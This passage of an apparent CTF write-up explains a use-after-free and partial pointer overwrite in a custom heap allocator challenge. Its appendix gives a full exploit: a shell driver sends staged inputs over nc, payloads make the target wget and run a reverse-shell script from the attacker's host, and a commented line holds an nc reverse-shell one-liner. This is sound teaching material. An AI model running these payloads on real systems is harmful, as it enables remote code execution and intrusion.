</span></span></code></pre></td></tr></table></div></div><p>We then proceed to free the first two allocations from <code>bucket_1</code>. We free two of them since the last one (due to the LIFO freelist order) will be replaced, using the <code>CMD_CREATE</code> command, with another <code>struct object</code> (<code>malloc(sizeof(struct object));</code>) and initialized with zeros (removing the possibility of a partial overwrite to bypass ASLR). The first freed allocation, instead, can be replaced with arbitrary user input due to the dynamic allocation through <code>strlen</code>. Due to this function, however, we are limited to its internal behaviors (e.g. it is not possible to have NULL bytes inside our payload).</p><a href=#partial-overwrite><h3 id=partial-overwrite><span class=hanchor arialabel=Anchor># </span>Partial Overwrite</h3></a><p>We can create, through <code>CMD_CREATE</code>, a fake object inside the <code>name</code> or the <code>description</code> string allocation, by making its size falling inside the <code>bucket_64</code>, in order to trigger the UAF against it.
We can perform a partial overwrite through the <code>memcpy</code> function (on the freed object) by replacing one or two bytes in order to not affect ASLR at all. <code>execute_system</code> is an interesting function that accepts a char pointer and pass it as a parameter to <code>system</code>, allowing the execution of arbitrary shell code. It can be a really interesting primitive due to a crucial thing: the <code>rdi</code> register (e.g. the first parameter) is the object itself (<code>this</code>) for function pointers. This means that, if we can redirect the execution to <code>execute_system</code>, we control entirely the first parameter that is the command to be executed! In order to see what we need to partially overwrite, we can execute <code>objdump</code> against the binary:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ objdump -D -M intel main <span class=p>|</span> grep <span class=s1>&#39;&lt;execute_system\|function_drop&#39;</span>
</span></span><span class=line><span class=cl><span class=m>0000000000001270</span> &lt;execute_system&gt;:
</span></span><span class=line><span class=cl>00000000000012c0 &lt;function_drop&gt;:
</span></span></code></pre></td></tr></table></div></div><p>The <code>function_drop</code> address is <code>00000000000012c0</code>, while <code>execute_system</code> is <code>0000000000001270</code>. If we overwrite the last byte of the <code>object->drop</code> pointer with <code>0x70</code> and we execute the <code>CMD_DROP</code> command later, we can trigger the execution of <code>system</code> with input in our control (the last allocated object itself):</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl>    <span class=c1># ID &amp; price</span>
</span></span><span class=line><span class=cl>    <span class=n>fake_obj</span> <span class=o>=</span> <span class=s2>&#34;AA;$(</span><span class=si>{}</span><span class=s2>);#&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>cmd</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1>#fake_obj += &#34;\x41&#34; * 0x2c</span>
</span></span><span class=line><span class=cl>    <span class=n>fake_obj</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x41</span><span class=s2>&#34;</span> <span class=o>*</span> <span class=p>(</span> <span class=mh>0x30</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=n>fake_obj</span><span class=p>)</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># CMD_DROP function pointer =&gt; @execute_system</span>
</span></span><span class=line><span class=cl>    <span class=c1># @execute_system</span>
</span></span><span class=line><span class=cl>    <span class=n>fake_obj</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x70</span><span class=s2>&#34;</span> <span class=o>+</span> <span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Create =&gt; alloc bucket1-&gt;freelist[1]</span>
</span></span><span class=line><span class=cl>    <span class=n>content</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x10</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>content</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x37\x13</span><span class=s2>&#34;</span>  <span class=c1># sh</span>
</span></span><span class=line><span class=cl>    <span class=n>content</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x16\x00</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=c1># Name: system payload</span>
</span></span><span class=line><span class=cl>    <span class=n>content</span> <span class=o>+=</span> <span class=s2>&#34;BB</span><span class=se>\x00</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=c1># Description: alloc on bucket1-&gt;freelist[0] (obj[0])</span>
</span></span><span class=line><span class=cl>    <span class=n>content</span> <span class=o>+=</span> <span class=n>fake_obj</span>
</span></span><span class=line><span class=cl>    <span class=n>content</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># CMD_DROP =&gt; Trigger arbitrary function call</span>
</span></span><span class=line><span class=cl>    <span class=n>content</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x14</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>content</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x41\x41</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>content</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>Since the <code>struct object</code> allocation is limited in size for a direct reverse shell, the vulnerability is exploited three times to first upload a complete reverse shell through <code>wget</code>, <code>chmod</code> and finally execute it.</p><a href=#alternative-solution-double-free><h2 id=alternative-solution-double-free><span class=hanchor arialabel=Anchor># </span>Alternative Solution (Double Free)</h2></a><p>An alternative, originally not the intended solution, can be to exploit the Double Free vulnerability instead. It is possible to return the same <code>alloc</code> twice by inserting (through exploitation) the same freelist offset inside the <code>bucket->freelist</code> and achieve the same objective. If you have solved the challenge in that way at the NoHat CTF or in a different moment, we are really curious about that, let us know!</p><a href=#conclusion><h2 id=conclusion><span class=hanchor arialabel=Anchor># </span>Conclusion</h2></a><p>The final exploit can be found
<a href=https://github.com/hacktivesec/nohat24-blog-references/tree/main/pwn/exploit rel=noopener>here</a>. Hope you have enjoyed this two article series on our CTF write-ups for the NoHat24 CTF event.</p><a href=#appendix><h2 id=appendix><span class=hanchor arialabel=Anchor># </span>Appendix</h2></a><a href=#exploit-code><h3 id=exploit-code><span class=hanchor arialabel=Anchor># </span>Exploit Code</h3></a><p><code>exploit.sh</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/bin/bash</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>[</span> <span class=s2>&#34;$#&#34;</span> <span class=o>-</span><span class=n>ne</span> <span class=mi>4</span> <span class=p>];</span> <span class=n>then</span>
</span></span><span class=line><span class=cl>    <span class=n>echo</span> <span class=s2>&#34;$0 &lt;RHOST&gt; &lt;RPORT&gt; &lt;LHOST&gt; &lt;LPORT&gt;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>exit</span>
</span></span><span class=line><span class=cl><span class=n>fi</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>RHOST</span><span class=o>=</span><span class=err>$</span><span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=n>RPORT</span><span class=o>=</span><span class=err>$</span><span class=mi>2</span>
</span></span><span class=line><span class=cl><span class=n>LHOST</span><span class=o>=</span><span class=err>$</span><span class=mi>3</span>
</span></span><span class=line><span class=cl><span class=n>LPORT</span><span class=o>=</span><span class=err>$</span><span class=mi>4</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>echo</span> <span class=s2>&#34;[*] Generating payload for the three stages&#34;</span>
</span></span><span class=line><span class=cl><span class=n>python3</span> <span class=n>generate_input_files</span><span class=o>.</span><span class=n>py</span> <span class=err>$</span><span class=n>LHOST</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>echo</span> <span class=s2>&#34;[*] Modifying script reverse shell to $LHOST:$LPORT&#34;</span>
</span></span><span class=line><span class=cl><span class=n>sed</span> <span class=o>-</span><span class=n>e</span> <span class=s2>&#34;s/LHOST/$LHOST/g&#34;</span> <span class=o>-</span><span class=n>e</span> <span class=s2>&#34;s/LPORT/$LPORT/g&#34;</span> <span class=n>rev</span><span class=o>.</span><span class=n>sh</span> <span class=o>&gt;</span> <span class=n>e</span>
</span></span><span class=line><span class=cl><span class=n>python3</span> <span class=n>generate_input_files</span><span class=o>.</span><span class=n>py</span> <span class=err>$</span><span class=n>LHOST</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>echo</span> <span class=s2>&#34;[*] Starting web browser&#34;</span>
</span></span><span class=line><span class=cl><span class=n>python3</span> <span class=o>-</span><span class=n>m</span> <span class=n>http</span><span class=o>.</span><span class=n>server</span><span class=o>&amp;</span>
</span></span><span class=line><span class=cl><span class=n>sleep</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>echo</span> <span class=s2>&#34;[*] Sending stage 1 to  $RHOST $PORT - wget http://$LHOST:8000/e&#34;</span>
</span></span><span class=line><span class=cl><span class=n>nc</span> <span class=o>-</span><span class=n>v</span> <span class=err>$</span><span class=n>RHOST</span> <span class=err>$</span><span class=n>RPORT</span> <span class=o>&lt;</span> <span class=n>input_file_1</span>
</span></span><span class=line><span class=cl><span class=n>echo</span> <span class=s2>&#34;[+] Done&#34;</span>
</span></span><span class=line><span class=cl><span class=n>sleep</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>echo</span> <span class=s2>&#34;[*] Sending stage 2 to  $RHOST $PORT&#34;</span>
</span></span><span class=line><span class=cl><span class=n>nc</span> <span class=o>-</span><span class=n>v</span> <span class=err>$</span><span class=n>RHOST</span> <span class=err>$</span><span class=n>RPORT</span> <span class=o>&lt;</span> <span class=n>input_file_2</span>
</span></span><span class=line><span class=cl><span class=n>echo</span> <span class=s2>&#34;[+] Done&#34;</span>
</span></span><span class=line><span class=cl><span class=n>sleep</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>echo</span> <span class=s2>&#34;[*] Sending stage 3 to  $RHOST $PORT.. The uploaded script should be executed&#34;</span>
</span></span><span class=line><span class=cl><span class=n>nc</span> <span class=o>-</span><span class=n>v</span> <span class=err>$</span><span class=n>RHOST</span> <span class=err>$</span><span class=n>RPORT</span> <span class=o>&lt;</span> <span class=n>input_file_3</span>
</span></span><span class=line><span class=cl><span class=n>echo</span> <span class=s2>&#34;[+] Done&#34;</span>
</span></span><span class=line><span class=cl><span class=n>sleep</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># kill web server</span>
</span></span><span class=line><span class=cl><span class=n>pkill</span> <span class=n>python3</span>
</span></span></code></pre></td></tr></table></div></div><p><code>generate_input_files.py</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>struct</span> <span class=kn>import</span> <span class=n>pack</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>print_stderr</span><span class=p>(</span><span class=n>msg</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sys</span><span class=o>.</span><span class=n>stderr</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>msg</span> <span class=o>+</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>exploit</span><span class=p>(</span><span class=n>cmd</span><span class=p>,</span> <span class=n>filename</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>objs</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=n>content</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=c1># Objective:</span>
</span></span><span class=line><span class=cl>    <span class=c1># Allocate 2 64 bytes buckets and make them full</span>
</span></span><span class=line><span class=cl>    <span class=c1># 520 = sizeof(struct bucket)</span>
</span></span><span class=line><span class=cl>    <span class=c1># 4096 - 520 = 3576 / 64 = 55</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>n</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>55</span> <span class=o>*</span> <span class=mi>2</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>obj_id</span> <span class=o>=</span> <span class=n>pack</span><span class=p>(</span><span class=s2>&#34;&lt;h&#34;</span><span class=p>,</span> <span class=nb>int</span><span class=p>(</span><span class=n>n</span><span class=p>))</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>objs</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>obj_id</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=c1># print_stderr(&#34;[*] Creating object {}&#34;.format(n))</span>
</span></span><span class=line><span class=cl>        <span class=c1># Create</span>
</span></span><span class=line><span class=cl>        <span class=n>content</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x10</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=n>content</span> <span class=o>+=</span> <span class=n>obj_id</span>
</span></span><span class=line><span class=cl>        <span class=n>content</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x16\x00</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=n>content</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x41</span><span class=s2>&#34;</span> <span class=o>*</span> <span class=mi>20</span> <span class=o>+</span> <span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=n>content</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x42</span><span class=s2>&#34;</span> <span class=o>*</span> <span class=mi>4</span> <span class=o>+</span> <span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=n>content</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Status</span>
</span></span><span class=line><span class=cl>    <span class=c1># Bucket 1: Fully allocated</span>
</span></span><span class=line><span class=cl>    <span class=c1># Bucket 2: Fully allocated (current)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Free two allocations from bucket 1</span>
</span></span><span class=line><span class=cl>    <span class=c1># Since bucket 2 is current and the traversing doesn&#39;t involve the </span>
</span></span><span class=line><span class=cl>    <span class=c1># quarantine mitigation, we can bypass it</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># DELETE (Free)</span>
</span></span><span class=line><span class=cl>    <span class=n>content</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x12</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>content</span> <span class=o>+=</span> <span class=n>objs</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>content</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># DELETE (Free)</span>
</span></span><span class=line><span class=cl>    <span class=n>content</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x12</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>content</span> <span class=o>+=</span> <span class=n>objs</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>content</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># ID &amp; price</span>
</span></span><span class=line><span class=cl>    <span class=n>fake_obj</span> <span class=o>=</span> <span class=s2>&#34;AA;$(</span><span class=si>{}</span><span class=s2>);#&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>cmd</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1>#fake_obj += &#34;\x41&#34; * 0x2c</span>
</span></span><span class=line><span class=cl>    <span class=n>fake_obj</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x41</span><span class=s2>&#34;</span> <span class=o>*</span> <span class=p>(</span> <span class=mh>0x30</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=n>fake_obj</span><span class=p>)</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># CMD_DROP function pointer</span>
</span></span><span class=line><span class=cl>    <span class=c1># @execute_system</span>
</span></span><span class=line><span class=cl>    <span class=n>fake_obj</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x70</span><span class=s2>&#34;</span> <span class=o>+</span> <span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Create =&gt; alloc bucket1-&gt;freelist[1]</span>
</span></span><span class=line><span class=cl>    <span class=n>content</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x10</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>content</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x37\x13</span><span class=s2>&#34;</span>  <span class=c1># sh</span>
</span></span><span class=line><span class=cl>    <span class=n>content</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x16\x00</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=c1># Name: system payload</span>
</span></span><span class=line><span class=cl>    <span class=c1># content += &#34;;mknod /tmp/mypipe p ; /bin/bash 0&lt; /tmp/mypipe | nc 127.0.0.1 4445 1&gt; /tmp/mypipe\x00&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>content</span> <span class=o>+=</span> <span class=s2>&#34;BB</span><span class=se>\x00</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=c1># Description: alloc on bucket1-&gt;freelist[0] (| obj[0])</span>
</span></span><span class=line><span class=cl>    <span class=n>content</span> <span class=o>+=</span> <span class=n>fake_obj</span>
</span></span><span class=line><span class=cl>    <span class=n>content</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># DROP =&gt; Trigger arbitrary function call</span>
</span></span><span class=line><span class=cl>    <span class=n>content</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x14</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>content</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x41\x41</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>content</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>filename</span><span class=p>,</span> <span class=s2>&#34;w&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>print_stderr</span><span class=p>(</span><span class=s2>&#34;[+] </span><span class=si>{}</span><span class=s2> generated&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>filename</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>exploit</span><span class=p>(</span><span class=s2>&#34;wget http://</span><span class=si>{}</span><span class=s2>:8000/e -O /tmp/e&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]),</span> <span class=s2>&#34;input_file_1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>exploit</span><span class=p>(</span><span class=s2>&#34;chmod +x /tmp/e&#34;</span><span class=p>,</span> <span class=s2>&#34;input_file_2&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>exploit</span><span class=p>(</span><span class=s2>&#34;/tmp/e&#34;</span><span class=p>,</span> <span class=s2>&#34;input_file_3&#34;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><a href=#challenge-source-code><h3 id=challenge-source-code><span class=hanchor arialabel=Anchor># </span>Challenge Source Code</h3></a><p><code>main.c</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&#34;hmalloc.h&#34;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
